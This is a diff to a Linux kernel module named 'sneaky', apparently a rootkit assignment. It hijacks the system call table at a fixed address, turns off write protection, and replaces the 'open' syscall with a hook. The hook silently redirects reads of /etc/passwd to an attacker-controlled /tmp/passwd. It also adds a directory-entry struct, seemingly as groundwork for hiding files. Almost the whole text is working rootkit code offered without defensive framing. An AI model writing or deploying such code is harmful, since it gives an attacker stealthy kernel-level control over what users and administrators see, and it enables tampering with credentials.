@@ -9,6 +9,16 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+
+// ?? to make sure that the “struct linux_dirent” is interpreted correctly ??
+struct linux_dirent {
+  u64            d_ino;
+  s64            d_off;
+  unsigned short d_reclen;
+  char           d_name[];
+}; 
+
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -35,17 +45,23 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 //////////////////////////////
 
 // function ptr to original systen call "open" (token: __NR_open)
-asmlinkage int (*original_open)(const char *pathname, int flags);
+asmlinkage int (*sys_open)(const char *pathname, int flags);
 
 // Define new "open"
 asmlinkage int sneaky_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Not So Sneaky!\n");
-
-  // return to the original "open"
-  return original_open(pathname, flags);
+  if (strcmp(pathname, "/etc/passwd") == 0) {
+    copy_to_user((void *)pathname, "/tmp/passwd", 12); 
+    // 12 = "/tmp/passwd"(11) + "\0"(1)
+  }
+  // return to the system "open"
+  return sys_open(pathname, flags);
 }
 
+
+/////////////////////
+///  
+/////////////////////
 
 ////////////////////////////////
 ///  module load/unload routine
@@ -77,7 +93,7 @@ static int initialize_sneaky_module(void)
   /////////////////////////////
 
   // substitute "open" system call (token: __NR_open )
-  original_open = (void*)*(sys_call_table + __NR_open);
+  sys_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;
 
 
@@ -118,7 +134,7 @@ static void exit_sneaky_module(void)
   //////////////////////////////////////////////////////////////////////
 
   // recover original "open" system call (token: __NR_open )
-  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_open) = (unsigned long)sys_open;
 
 
   /////////////////
